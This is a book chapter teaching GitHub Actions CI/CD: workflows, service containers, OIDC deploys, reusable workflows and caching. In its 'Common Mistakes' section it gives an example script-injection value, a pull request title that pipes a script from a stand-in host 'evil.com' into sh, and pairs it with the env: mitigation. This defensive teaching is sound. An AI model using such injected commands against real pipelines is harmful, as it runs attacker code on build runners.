---
title: GitHub Actions
part: 8
chapter: 0
slug: github-actions
level: intermediate # beginner | intermediate | advanced
reading_time: 12
updated: 2026-08-28
tags: [devops, cicd, github, actions]
in_book: true
---

# GitHub Actions {#ch-github-actions}

> Write a workflow that tests, builds and deploys with no long-lived cloud credentials in it.

**In this chapter:** workflows, jobs and steps · a complete CI workflow · real dependencies as service containers · OIDC deploys · reusable workflows and caching

## 💡 The Core Idea

A workflow is a set of jobs, and **every job gets a clean machine**. That one fact explains most of
the API. Jobs run in parallel unless you declare a dependency, nothing on disk survives between them,
and anything you want to move from one job to the next has to be an artefact or a cache. Design the
job graph first and the YAML mostly writes itself.

> ⚠️ **Moving target:** action major versions move roughly yearly — `actions/checkout` is on v6 and
> `actions/setup-node` on v7 as of 2026. The durable principle is that a version tag is mutable and a
> commit SHA is not. Pin third-party actions by SHA; the version numbers below will age.

## How It Works

```mermaid
flowchart TD
  E[Event: push, pull_request, schedule] --> W[Workflow<br/>.github/workflows/ci.yml]
  W --> J1[Job: test — fresh runner]
  W --> J2[Job: build — fresh runner]
  J1 -->|needs:| J2
```

**A workflow fans out into jobs; `needs:` is what turns parallel jobs back into a sequence.**

| Concept | What it is |
| ------- | ---------- |
| **Workflow** | One YAML file in `.github/workflows/` |
| **Job** | A set of steps on a fresh runner. Parallel by default |
| **Step** | A single `run` command, or a `uses` action |
| **Action** | A packaged, shareable step (`actions/checkout`) |
| **Runner** | The virtual machine executing the job, GitHub-hosted or self-hosted |

## A Complete CI Workflow

```yaml
name: CI

on:
  pull_request: { branches: [main] }
  push: { branches: [main] }

# Cancel superseded runs on the same branch — saves runner minutes
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read # least privilege by default; widen per job

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [22, 24] # Maintenance and Active LTS
        shard: [1, 2] # split the suite across runners
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          cache: npm # built-in dependency caching
      - run: npm ci
      - run: npm run lint && npm run type-check
      - run: npm test -- --shard=${{ matrix.shard }}/2 --coverage

  build:
    needs: test # only runs if every matrix leg passed
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          push: false
          tags: api:${{ github.sha }}
          cache-from: type=gha # layer cache backed by Actions cache
          cache-to: type=gha,mode=max
```

| Pattern | Why it is there |
| ------- | --------------- |
| `concurrency` + `cancel-in-progress` | Stops paying runners for outdated commits |
| `permissions: contents: read` | The default token is read-only; widen per job only |
| `matrix` | Runtime versions and test shards, in parallel |
| `fail-fast: false` | One failing leg should not hide the others |
| `needs:` | The dependency graph between jobs |
| `cache: npm` | Install time from minutes to seconds |

## Real Dependencies as Service Containers

Mocking the database in an integration test hides exactly the bugs that reach production: wrong SQL,
a missing index, a bad transaction boundary. Actions can start real ones alongside the job.

```yaml
integration:
  runs-on: ubuntu-latest
  services:
    postgres:
      image: postgres:17
      env: { POSTGRES_PASSWORD: test }
      ports: ["5432:5432"]
      options: >-
        --health-cmd pg_isready --health-interval 10s --health-retries 5
  env:
    DATABASE_URL: postgres://postgres:test@localhost:5432/test
  steps:
    - uses: actions/checkout@v6
    - run: npm ci && npm run migrate
    - run: npm run test:integration
```

⚠️ Without the `--health-cmd` options the job races the container. Postgres accepts a TCP connection
before it will accept a query, so the first test fails roughly one run in ten — which reads as
flakiness rather than as a missing health check.

✅ **Testcontainers** is the portable alternative: the test code starts the container itself, so the
same setup works locally and on any CI platform. Use it when the pipeline is not the only place the
suite runs.

## Deploying with OIDC — No Static Keys

This is the single most-asked GitHub Actions security question.

❌ **Long-lived IAM user keys stored as repository secrets:**

```yaml
- uses: aws-actions/configure-aws-credentials@<sha>
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }} # never rotates
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

✅ **OIDC federation — credentials that expire in an hour:**

```yaml
deploy:
  runs-on: ubuntu-latest
  environment: production # gated by required reviewers
  permissions:
    id-token: write # required to request the OIDC JWT
    contents: read
  steps:
    - uses: actions/checkout@v6
    - uses: aws-actions/configure-aws-credentials@<full-commit-sha>
      with:
        role-to-assume: arn:aws:iam::123456789:role/github-deploy
        role-session-name: gha-${{ github.run_id }}
        aws-region: eu-west-1
    - run: |
        docker build -t $ECR/api:${{ github.sha }} .
        docker push $ECR/api:${{ github.sha }}
```

The job asks GitHub's OIDC provider for a signed JWT carrying claims about the repository, ref,
environment and workflow. It exchanges that JWT for temporary cloud credentials. Nothing is stored,
so nothing needs rotating. The mechanism, the trust policy and the mistake people make in it are in
[Chapter ?? — Pipeline Security](#ch-cicd-security).

✅ Name the role session after the run — `gha-${{ github.run_id }}` — and every cloud API call the
pipeline makes is traceable back to one workflow run in the audit log.

✅ An **environment** — `environment: { name: production }` on the job — attaches protection rules
that live in repository settings rather than the YAML: required reviewers who must approve before the
job resumes, a wait timer, a branch restriction so only `main` may deploy, and per-environment
secrets. That is Continuous Delivery's human gate, with no custom logic to write.

## Reusable Workflows and Composite Actions

Both remove duplication; they solve different problems.

| | Reusable workflow | Composite action |
| - | ----------------- | ---------------- |
| **Contains** | Whole jobs | A group of steps |
| **Called at** | Job level | Step level |
| **Own runner** | ✅ Yes | ❌ Runs inside the caller's job |
| **Secrets** | ✅ `secrets: inherit` | Passed as inputs |
| **Use for** | A standard build-and-deploy pipeline across repos | A repeated step sequence — set up Node, log into the registry |

**The caller:**

```yaml
jobs:
  deploy-staging:
    uses: acme/ci-templates/.github/workflows/deploy.yml@v1
    with: { environment: staging }
    secrets: inherit
```

✅ One versioned reusable workflow is how a platform team enforces the same gates across fifty
repositories without fifty copies of the YAML drifting apart.

## Caching

```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      .next/cache
    key: ${{ runner.os }}-build-${{ hashFiles('**/package-lock.json') }}
    restore-keys: ${{ runner.os }}-build-
```

`key` is an exact match — a hit restores and skips saving. `restore-keys` is a prefix fallback for
when the lockfile changed. `hashFiles()` is what makes the cache invalidate itself.

| | Cache | Artefact |
| - | ----- | -------- |
| **Purpose** | Make builds faster | Pass files between jobs, or keep an output |
| **Lifetime** | Evicted after 7 days unused | Explicit retention, downloadable |
| **On miss** | Slower build, nothing breaks | The consuming job fails |
| **Use for** | `~/.npm`, build caches, layers | Build output, coverage, test reports |

⚠️ A cache entry is immutable once written for a key, and caches are scoped per branch — a branch can
read the default branch's cache but not another branch's. A cache key that never changes is a cache
that never updates.

## Common Mistakes

❌ **Interpolating event data into a `run` block.** A pull request title of `"; curl evil.com/x.sh | sh`
executes on the runner, because `${{ }}` substitutes before the shell sees the line.
✅ Pass it through `env:` so the shell treats it as data:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

❌ **`pull_request_target` on a workflow that runs contributor code.** It runs with repository secrets
against an untrusted fork — the exploit is worked through in [Chapter ?? — Pipeline Security](#ch-cicd-security).
✅ Use `pull_request`, which runs without secrets by design.

❌ **Pinning third-party actions to a tag.** Whoever owns the action can repoint `@v2` at new code.
✅ Pin to a full commit SHA. First-party `actions/*` on a major tag is the accepted trade-off; nothing
else.

## 🔑 Key Takeaways

- Every job gets a clean runner, so use artefacts to move files and caches to avoid re-downloading them.
- Declare `permissions:` explicitly, starting from `contents: read`, and widen only on the job that needs it.
- Replace stored cloud keys with OIDC and gate production behind an environment with required reviewers.
- Start real databases as service containers with a health check, rather than mocking them.
- Never interpolate `${{ github.event.* }}` inside a `run:` block — pass it through `env:`.

## Interview Questions

**Q: How do you authenticate a workflow to a cloud provider without storing credentials?**

Use OIDC federation. Register the provider's OIDC issuer as an identity provider in the cloud
account, then create a role whose trust policy accepts tokens from it with conditions on the `sub`
claim, restricting it to one repository and one environment. The workflow grants `id-token: write`,
and the credentials action exchanges the GitHub-issued JWT for temporary credentials that expire in
about an hour. There are no keys to rotate or leak, and the trust policy — not the YAML — decides who
can deploy where.

**Q: What is the difference between a reusable workflow and a composite action?**

A reusable workflow is called at the job level, defines complete jobs, runs on its own runner, and
can take secrets directly with `secrets: inherit`. A composite action is called at the step level and
bundles a sequence of steps that run inside the caller's job on the caller's runner. Composite
actions are for repeated step groups like "set up Node and log into the registry"; reusable workflows
are for standardising an entire build-and-deploy pipeline across many repositories.

**Q: What is the difference between caching and artefacts?**

A cache is a best-effort speed optimisation — dependency directories or build caches keyed on a
lockfile hash, where a miss just means a slower run. An artefact is an output you explicitly want:
build bundles, coverage, test reports, with a defined retention period and a download link on the run
page. Because every job gets a fresh runner, artefacts are how you move files between jobs and caches
are how you avoid re-downloading the same dependencies in each of them.

**Q: When would you use a self-hosted runner, and what does it cost you?**

When the job needs something a hosted runner cannot give: network access to a private database for
integration tests, specific hardware, or a cache too large to restore each run. The cost is that you
now own a machine in the trust boundary of your pipeline. It must be ephemeral so no state leaks
between builds, it must never be attached to a public repository, and it needs the same patching and
least-privilege discipline as production. For most teams the hosted runner plus a service container
is the better answer.

## What to Read Next

- [Chapter ?? — Pipeline Security](#ch-cicd-security) — the trust policy, supply chain pinning, and what a leaked token buys an attacker
- [Chapter ?? — Deployment Strategies](#ch-deployment-strategies) — what the deploy job should actually do with the image
- [Chapter ?? — Building and Hardening Images](#ch-building-and-hardening-images) — why the build cache and the shipped layers are the same thing
